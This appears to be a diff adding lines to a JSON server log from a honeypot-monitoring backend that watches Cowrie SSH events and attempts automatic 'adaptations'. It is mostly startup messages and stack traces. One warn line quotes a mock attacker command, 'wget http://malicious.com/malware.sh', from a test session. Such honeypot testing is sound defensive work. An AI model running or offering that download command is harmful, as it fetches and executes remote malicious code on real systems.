@@ -1,1 +1,30 @@
 {"code":"28P01","file":"auth.c","length":104,"level":"error","line":"331","message":"Database connection failed: password authentication failed for user \"honeynet\"","name":"error","routine":"auth_failed","severity":"FATAL","stack":"error: password authentication failed for user \"honeynet\"\n    at C:\\Users\\abhay\\OneDrive\\Desktop\\Project_mohit\\backend\\node_modules\\pg-pool\\index.js:45:11\n    at process.processTicksAndRejections (node:internal/process/task_queues:105:5)\n    at async Database.connect (C:\\Users\\abhay\\OneDrive\\Desktop\\Project_mohit\\backend\\src\\database\\connection.js:20:22)\n    at async startServer (C:\\Users\\abhay\\OneDrive\\Desktop\\Project_mohit\\backend\\src\\index.js:85:5)","timestamp":"2025-11-29 00:02:24"}
+{"level":"info","message":"PostgreSQL connected successfully","timestamp":"2025-11-29 10:15:54"}
+{"level":"info","message":"Database connected successfully","timestamp":"2025-11-29 10:15:54"}
+{"level":"info","message":"Starting log watcher on: /mock-data/cowrie.json","timestamp":"2025-11-29 10:15:54"}
+{"level":"info","message":"Log watcher active","timestamp":"2025-11-29 10:15:54"}
+{"level":"info","message":"Log watcher started successfully","timestamp":"2025-11-29 10:15:54"}
+{"level":"info","message":"Server running on port 3000","timestamp":"2025-11-29 10:15:54"}
+{"level":"info","message":"Environment: production","timestamp":"2025-11-29 10:15:54"}
+{"level":"info","message":"ML Service: http://ml-service:8001","timestamp":"2025-11-29 10:15:54"}
+{"level":"info","message":"Cowrie log: /mock-data/cowrie.json","timestamp":"2025-11-29 10:15:54"}
+{"error":"Unexpected token e in JSON at position 0","level":"warn","line":"eventid:cowrie.command.input timestamp:2025-11-29T10:20:00.123456Z session:test-session-1 src_ip:192.168.1.66 input:wget http://malicious.com/malware.sh message:Command found: wget http://malicious.com/malware.sh","message":"Failed to parse JSON line:","timestamp":"2025-11-29 10:16:29"}
+{"level":"info","message":"Shutting down gracefully...","timestamp":"2025-11-29 10:27:20"}
+{"level":"info","message":"PostgreSQL connected successfully","timestamp":"2025-11-29 10:27:22"}
+{"level":"info","message":"Database connected successfully","timestamp":"2025-11-29 10:27:22"}
+{"level":"info","message":"Starting log watcher on: /mock-data/cowrie.json","timestamp":"2025-11-29 10:27:22"}
+{"level":"info","message":"Log watcher active","timestamp":"2025-11-29 10:27:22"}
+{"level":"info","message":"Log watcher started successfully","timestamp":"2025-11-29 10:27:22"}
+{"level":"info","message":"Server running on port 3000","timestamp":"2025-11-29 10:27:22"}
+{"level":"info","message":"Environment: production","timestamp":"2025-11-29 10:27:22"}
+{"level":"info","message":"ML Service: http://ml-service:8001","timestamp":"2025-11-29 10:27:22"}
+{"level":"info","message":"Cowrie log: /mock-data/cowrie.json","timestamp":"2025-11-29 10:27:22"}
+{"ip":"192.168.1.77","level":"info","message":"EVENT: Received","session":"test-session-2","timestamp":"2025-11-29 10:27:32","type":"cowrie.command.input"}
+{"details":{"event_id":"ec467230-d428-4f90-b271-7ec2a687ede0","source_ip":"192.168.1.77"},"level":"info","message":"ADAPTATION: Starting adaptation","severity":"HIGH","timestamp":"2025-11-29 10:27:33"}
+{"level":"error","message":"Failed to change banner: COWRIE_CONFIG_PATH not configured","stack":"Error: COWRIE_CONFIG_PATH not configured\n    at AdaptationService.changeBanner (/app/src/services/adaptationService.js:80:15)\n    at AdaptationService.adapt (/app/src/services/adaptationService.js:47:33)\n    at EventProcessor.process (/app/src/services/eventProcessor.js:35:35)\n    at process.processTicksAndRejections (node:internal/process/task_queues:95:5)\n    at async LogWatcher.processLine (/app/src/services/logWatcher.js:111:7)\n    at async Tail.<anonymous> (/app/src/services/logWatcher.js:62:9)","timestamp":"2025-11-29 10:27:33"}
+{"level":"error","message":"Failed to modify honeyfiles: COWRIE_HONEYFILES_PATH not configured","stack":"Error: COWRIE_HONEYFILES_PATH not configured\n    at AdaptationService.modifyHoneyfiles (/app/src/services/adaptationService.js:127:15)\n    at AdaptationService.adapt (/app/src/services/adaptationService.js:50:33)\n    at process.processTicksAndRejections (node:internal/process/task_queues:95:5)\n    at async EventProcessor.process (/app/src/services/eventProcessor.js:35:11)\n    at async LogWatcher.processLine (/app/src/services/logWatcher.js:111:7)\n    at async Tail.<anonymous> (/app/src/services/logWatcher.js:62:9)","timestamp":"2025-11-29 10:27:33"}
+{"level":"info","message":"Restarting Cowrie...","timestamp":"2025-11-29 10:27:33"}
+{"cmd":"sudo systemctl restart cowrie","code":127,"killed":false,"level":"error","message":"Failed to restart Cowrie: Command failed: sudo systemctl restart cowrie\n/bin/sh: sudo: not found\n","signal":null,"stack":"Error: Command failed: sudo systemctl restart cowrie\n/bin/sh: sudo: not found\n\n    at ChildProcess.exithandler (node:child_process:422:12)\n    at ChildProcess.emit (node:events:517:28)\n    at maybeClose (node:internal/child_process:1098:16)\n    at Socket.<anonymous> (node:internal/child_process:450:11)\n    at Socket.emit (node:events:517:28)\n    at Pipe.<anonymous> (node:net:350:12)","stderr":"/bin/sh: sudo: not found\n","stdout":"","timestamp":"2025-11-29 10:27:33"}
+{"failed":3,"level":"info","message":"Adaptation recorded","successful":0,"timestamp":"2025-11-29 10:27:33","total":3}
+{"details":{"actions":3},"level":"info","message":"ADAPTATION: Adaptation complete","severity":"HIGH","timestamp":"2025-11-29 10:27:33"}
+{"level":"info","message":"Shutting down gracefully...","timestamp":"2025-11-29 12:22:55"}
